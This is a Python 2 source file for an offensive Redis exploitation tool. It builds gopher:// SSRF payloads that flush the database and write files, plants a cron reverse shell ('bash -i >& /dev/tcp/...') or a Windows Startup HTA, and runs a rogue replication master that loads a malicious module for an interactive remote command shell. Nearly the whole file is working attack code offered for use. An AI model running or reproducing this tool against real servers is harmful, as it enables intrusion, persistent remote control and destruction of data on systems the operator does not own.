#coding=utf-8
import urllib
import random
import socket
import time
global password
def redis_format(arr):
    redis_arr=arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+="\r\n"+"$"+str(len(x))+"\r\n"+x
    cmd+="\r\n"
    return cmd

def redis_connect(rhost,rport):
    sock=socket.socket()
    sock.connect((rhost,rport))
    return sock

def send(sock,cmd):
    sock.send(redis_format(cmd))
    print(sock.recv(1024).decode("utf-8"))

def Writefile_interact(cmdshell):
	global password
	rhost = raw_input("input the rhost\r\n")
	rport = raw_input("input the rport\r\n")
	lhost = raw_input("input the lhost(should be the Internet IP address ofthis host)\r\n")
	lport = raw_input("input the lport\r\n")
	if cmdshell:
		lfile = "exp.so"
		file = "exp.so"
		path = ""
	else :
		lfile = raw_input("input a local filepath to upload it\r\n")
		rfile = raw_input("input a remote filepath you want it to be\r\n")
		count = rfile.rfind("/")
		path = rfile[0:count+1]
		file = rfile[count+1:len(rfile)]
	rport = int(rport) #必须是int
	redis_sock=redis_connect(rhost,rport) #连接对方的redis
	if password != "":
		send(redis_sock,"AUTH {}".format(password)) #密码
	send(redis_sock,"SLAVEOF {} {}".format(lhost,lport))	#设置主从
	if path !="":
		send(redis_sock,"config set dir {}".format(path))	#文件保存路径
	send(redis_sock,"config set dbfilename {}".format(file))	#文件名
	time.sleep(2)
	lport = int(lport)
	RogueServer(lport,lfile)
	if cmdshell:
		send(redis_sock,"MODULE LOAD exp.so")
	return redis_sock #将redis_sock回传以备需求
def interact_shell(sock):
    flag=True
    try:
        while flag:
            shell=raw_input("\033[1;32;40m[*]\033[0m ")
            shell=shell.replace(" ","${IFS}")
            if shell=="exit" or shell=="quit":
            	send(sock,"system.exec 'rm ./exp.so'")
                flag=False
            else:
                send(sock,"system.exec {}".format(shell))
    except KeyboardInterrupt:
        return
def redis():
	global password
	print "Now We try to do sth with Redis!\r\n"
	what = raw_input("""What do you what\r\n"""+
		"""0.WindowsStartUp\r\n"""
		"""1.Ssh_Pub_key_Attack\r\n"""+
		"""2.CentosReverseShell\r\n"""+
		"""3.Writefile\r\n"""
		"""4.Cmdshell\r\n"""
		"""5.FileUpload\r\n"""
		)
	password = raw_input("password\r\n")
	ranstr = str(random.randint(1000,9999))
	if what == "0":
		content = raw_input('autorun as a hta file.code like <SCRIPT Language="JScript">new ActiveXObject("WScript.Shell").run("calc.exe");</SCRIPT>\r\n')
		if content == "":
			content = '<SCRIPT Language="JScript">new ActiveXObject("WScript.Shell").run("calc.exe");</SCRIPT>'
		path = 'C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
		file = 'test'+ranstr+'.hta'
		Writefile(path, file, content, password)
	elif what == "1":
		print "To be continued" #考虑到各个版本可能/.ssh目录不太一致这个地方先留空吧，等有空了再写，可以自行利用FileUpload模块实现
	elif what == "2":
		print "ReverseShell can be used in cenos only"
		backshell = raw_input("input back_tcp like 1.2.3.4/1234\r\n")
		path = "/var/spool/cron/"
		file = "testredis"+ranstr
		content ='\n\n*/1 * * * * bash -i >& /dev/tcp/'+backshell+' 0>&1\n\n'
		Writefile(path, file, content, password)
	elif what == "3":
		path = raw_input("path\r\n")
		file = raw_input("file\r\n")
		content = raw_input("content\r\n")
		Writefile(path, file, content, password)
	elif what == "4":
		print "Cmdshell can be used in Linux OS &the version of Redis >=4.0 only"
		redis_sock = Writefile_interact(True)
		interact_shell(redis_sock)
		send(redis_sock,"SLAVEOF NO ONE")
		send(redis_sock,"MODULE UNLOAD system")
		#redis_sock.close()
	elif what == "5":
		redis_sock = Writefile_interact(False)
		send(redis_sock,"SLAVEOF NO ONE")
		#redis_sock.close()
	else :
		print "Wrong input"

def RogueServer(lport,file):
	#Modified from	https://xz.aliyun.com/t/5665
    file = open(file,"rb").read()
    flag=True
    result=""
    sock=socket.socket()
    sock.bind(("0.0.0.0",lport))
    sock.listen(10)
    clientSock, address = sock.accept()
    while flag:
        data = clientSock.recv(1024)
        if "PING" in data:
            result="+PONG"+ "\r\n"
            clientSock.send(result)
            flag=True
        elif "REPLCONF" in data:
            result="+OK"+"\r\n"
            clientSock.send(result)
            flag=True
        elif "PSYNC" in data or "SYNC" in data:
            result = "+FULLRESYNC " + "a" * 40 + " 1" + "\r\n"
            result += "$" + str(len(file)) + "\r\n"
            result = result.encode()
            result += file
            result += "\r\n"
            clientSock.send(result)
            flag=False


def Writefile(path,file,content,password = ''):
	content = "\r\n" + content + "\r\n" #前后加上回车，防止脏数据
	payload = "*1\r\n$8\r\nflushall\r\n*3\r\n$3\r\nset\r\n$1\r\na\r\n$"+str(len(content))+"\r\n"+content+"\r\n"+"*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$"+str(len(path))+"\r\n"+path+"\r\n"+"*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$"+str(len(file))+"\r\n"+file+"\r\n"+"*1\r\n$4\r\nsave\r\n"
	auth = "*2\r\n$4\r\nauth\r\n$"+str(len(password))+"\r\n"+password+"\r\n"
	if password != '':
		payload = auth + payload
	payload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
	target = raw_input("target_ip\r\n")
	port = raw_input("target_port\r\n")
	target = target + ":" + port
	print "gopher://"+target+"/_"+payload
	
if __name__ == '__main__':
	redis()	